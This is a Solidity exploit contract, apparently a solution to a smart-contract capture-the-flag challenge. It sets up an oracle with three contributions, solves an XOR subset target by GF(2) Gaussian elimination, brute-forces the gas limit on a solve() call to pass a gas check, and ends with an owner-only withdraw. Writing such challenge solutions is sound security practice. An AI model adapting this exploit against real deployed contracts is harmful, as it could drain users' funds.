// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IOracle {
    function contribute(uint256 _value) external payable;
    function poke() external;
    function getRotation() external view returns (uint256);
    function contributorCount() external view returns (uint256);
}

interface IScore {
    function solve(uint256[] calldata _indices) external;
    function seed() external view returns (bytes32);
    function generateTarget() external view returns (bytes32);
    function getElement(uint256 _index) external view returns (bytes32);
    function isSolved() external view returns (bool);
}

interface IChallenge {
    function isSolved() external view returns (bool);
    function ORACLE() external view returns (address);
    function SCORE() external view returns (address);
}

contract ScoreAttack {
    address public owner;
    IChallenge public challenge;
    IOracle public oracle;
    IScore public score;

    constructor(address _challenge) {
        owner = msg.sender;
        challenge = IChallenge(_challenge);
        oracle = IOracle(challenge.ORACLE());
        score = IScore(challenge.SCORE());
    }

    /// @notice Full exploit in one call
    /// @param _v1 First contribute value
    /// @param _v2 Second contribute value
    /// @param _v3 Third contribute value
    function exploit(uint256 _v1, uint256 _v2, uint256 _v3) external {
        require(msg.sender == owner, "not owner");

        // Step 1: Setup oracle with 3 contributions
        oracle.contribute(_v1);
        oracle.contribute(_v2);
        oracle.contribute(_v3);

        uint256 r = oracle.getRotation();
        require(r == 0, "rotation != 0");

        // Step 2: Solve XOR system using GF(2) Gaussian elimination
        bytes32 target = score.generateTarget();
        uint256[] memory indices = _solveXorGF2(target);

        // Step 3: Compute gas limit for this block
        bytes32 scoreSeed = score.seed();
        uint256 gasLimit;
        assembly {
            mstore(0x00, scoreSeed)
            mstore(0x20, number())
            gasLimit := add(mod(keccak256(0x00, 0x40), 40000), 10000)
        }

        // Step 4: Call solve with try/catch, searching for right gas amount
        // solve() costs roughly 30k-150k gas depending on indices length
        // We need remaining gas at gas check to be <= gasLimit
        // Try increasing gas amounts until one works
        bool solved = false;
        for (uint256 extra = 20000; extra < 300000; extra += 500) {
            uint256 g = gasLimit + extra;
            if (gasleft() < g + 5000) break; // not enough gas left
            try score.solve{gas: g}(indices) {
                solved = true;
                break;
            } catch {}
        }
        require(solved, "Could not solve with correct gas");
    }

    /// @notice GF(2) Gaussian elimination
    /// Find subset of elements {e[0]..e[255]} whose XOR equals target
    function _solveXorGF2(bytes32 _target) internal view returns (uint256[] memory) {
        // Build basis using 256 elements (indices 0..255)
        uint256[256] memory basis;
        uint256[256] memory masks; // bitmask of which original elements form each basis vector

        for (uint256 i = 0; i < 256; i++) {
            uint256 v = uint256(score.getElement(i));
            uint256 m = 1 << i;

            for (uint256 bit = 255; bit < 256; bit--) { // wraps around to max on underflow
                uint256 bitMask = 1 << bit;
                if (v & bitMask == 0) continue;

                if (basis[bit] == 0) {
                    basis[bit] = v;
                    masks[bit] = m;
                    break;
                }
                v ^= basis[bit];
                m ^= masks[bit];
            }
        }

        // Solve: reduce target against basis
        uint256 remaining = uint256(_target);
        uint256 solutionMask = 0;

        for (uint256 bit = 255; bit < 256; bit--) {
            uint256 bitMask = 1 << bit;
            if (remaining & bitMask == 0) continue;

            require(basis[bit] != 0, "GF2: no solution (incomplete basis)");
            remaining ^= basis[bit];
            solutionMask ^= masks[bit];
        }
        require(remaining == 0, "GF2: no solution");

        // Convert bitmask to indices array
        uint256 count = 0;
        for (uint256 i = 0; i < 256; i++) {
            if (solutionMask & (1 << i) != 0) count++;
        }

        uint256[] memory indices = new uint256[](count);
        uint256 idx = 0;
        for (uint256 i = 0; i < 256; i++) {
            if (solutionMask & (1 << i) != 0) {
                indices[idx++] = i;
            }
        }

        return indices;
    }

    function withdraw() external {
        require(msg.sender == owner, "not owner");
        (bool s,) = owner.call{value: address(this).balance}("");
        require(s);
    }

    receive() external payable {}
}
